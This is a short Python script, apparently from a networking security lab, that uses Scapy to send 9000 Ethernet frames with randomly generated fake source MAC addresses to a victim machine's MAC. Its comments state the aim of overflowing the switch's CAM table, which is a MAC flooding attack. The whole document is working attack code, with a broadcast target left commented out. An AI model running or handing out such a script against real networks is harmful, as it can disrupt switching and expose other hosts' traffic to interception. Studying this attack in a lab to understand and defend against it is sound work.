from scapy.all import *
import random,string

for i in range(9000):
        ##trame captures the Ethernet packets using scapy.all.Ether()
        trame = Ether()
        ##declaring the MAC address of Victim machine
        trame.dst = '02:42:0a:09:00:06'
        ##declaring the MAC address to broadcast across the network
##        trame.dst = 'ff:ff:ff:ff:ff:ff'
        ##Creating the list of fake MAC addresses to overpopulate the CAM table at the victim/broadcast
        MAC_src_fake_list = [''.join(random.choice('abcdef' + string.digits) for _ in range(2)) for i in range(6)]
        ##declaring source from the random list of MAC addresses
        trame.src = ':'.join(MAC_src_fake_list)
        ##sending the same to the target machine
        sendp(trame)
     
